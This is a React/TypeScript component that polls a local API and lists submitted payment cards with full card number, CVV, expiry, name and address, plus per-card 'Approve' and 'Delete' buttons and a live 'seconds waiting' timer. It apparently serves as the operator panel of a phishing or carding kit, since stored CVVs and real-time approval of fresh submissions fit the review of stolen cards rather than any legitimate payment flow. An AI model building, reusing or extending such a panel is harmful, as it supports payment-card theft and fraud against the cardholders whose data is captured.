import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import axios from "axios";
import { useEffect, useState } from "react";

type CardInfo = {
  id: number;
  user_id: string;
  card_number: string;
  name_on_card: string;
  exp_month: string;
  exp_year: string;
  street_address: string;
  zip_code: string;
  cvv: string;
  status: string;
  created_at: string;
};

const fetchCards = async (): Promise<CardInfo[]> => {
  const res = await axios.get("http://localhost:4000/api/cards");
  return res.data;
};

export default function Edit() {
  const queryClient = useQueryClient();
  const [now, setNow] = useState(Date.now()); // for live timers

  // Fetch cards and poll every 5s
  const { data: cards, isLoading } = useQuery<CardInfo[]>({
    queryKey: ["cards"],
    queryFn: fetchCards,
    refetchInterval: 5000, // poll every 5s
  });

  // Approve mutation
  const approveMutation = useMutation({
    mutationFn: (id: number) =>
      axios.post(`http://localhost:4000/api/cards/${id}/approve`),
    onSuccess: () => queryClient.invalidateQueries({ queryKey: ["cards"] }),
  });

  // Delete mutation
  const deleteMutation = useMutation({
    mutationFn: (id: number) =>
      axios.delete(`http://localhost:4000/api/cards/${id}`),
    onSuccess: () => queryClient.invalidateQueries({ queryKey: ["cards"] }),
  });

  // Update "now" every second for live timers
  useEffect(() => {
    const timer = setInterval(() => setNow(Date.now()), 1000);
    return () => clearInterval(timer);
  }, []);

  return (
    <div className="p-8 bg-gray-100 min-h-screen">
      <h1 className="text-3xl font-bold mb-6 text-gray-800">user details</h1>

      {isLoading ? (
        <div className="flex justify-center items-center h-64">
          <div className="loader ease-linear rounded-full border-8 border-t-8 border-gray-200 h-16 w-16"></div>
        </div>
      ) : !cards || cards.length === 0 ? (
        <p className="text-gray-500 text-lg">No submissions yet...</p>
      ) : (
        <div className="overflow-x-auto bg-white shadow-md rounded-lg">
          <table className="min-w-full divide-y divide-gray-200">
            <thead className="bg-gray-50">
              <tr>
                {[
                  "ID",

                  "Name on Card",
                  "Card Number",
                  "Exp",
                  "Address",
                  "ZIP",
                  "CVV",
                  "Status",
                  "Submitted",
                  "Actions",
                ].map((header) => (
                  <th
                    key={header}
                    className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider"
                  >
                    {header}
                  </th>
                ))}
              </tr>
            </thead>
            <tbody className="bg-white divide-y divide-gray-200">
              {cards.map((card) => {
                // Calculate delay for pending cards
                const createdAt = new Date(card.created_at).getTime();
                const secondsPending = Math.floor((now - createdAt) / 1000);

                return (
                  <tr
                    key={card.id}
                    className={`hover:bg-gray-50 ${
                      card.status !== "approved" ? "bg-yellow-50" : ""
                    }`}
                  >
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-700">
                      {card.id}
                    </td>
                    {/* <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-700">
                      {card.user_id}
                    </td> */}
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-700">
                      {card.name_on_card}
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-700">
                      {card.card_number}
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-700">
                      {card.exp_month}/{card.exp_year}
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-700">
                      {card.street_address}
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-700">
                      {card.zip_code}
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-700">
                      {card.cvv}
                    </td>
                    <td
                      className={`px-6 py-4 whitespace-nowrap text-sm font-semibold ${
                        card.status === "approved"
                          ? "text-green-600"
                          : "text-yellow-600"
                      }`}
                    >
                      {card.status}
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-700">
                      {card.status === "approved"
                        ? "✅"
                        : `${secondsPending}s waiting`}
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm flex space-x-2">
                      {card.status !== "approved" && (
                        <button
                          onClick={() => approveMutation.mutate(card.id)}
                          className="px-3 py-1 bg-green-500 text-white rounded hover:bg-green-600 transition"
                        >
                          Approve
                        </button>
                      )}
                      <button
                        onClick={() => deleteMutation.mutate(card.id)}
                        className="px-3 py-1 bg-red-500 text-white rounded hover:bg-red-600 transition"
                      >
                        Delete
                      </button>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>
      )}

      <style>
        {`
          .loader {
            border-top-color: #3498db;
            animation: spin 1s linear infinite;
          }
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        `}
      </style>
    </div>
  );
}
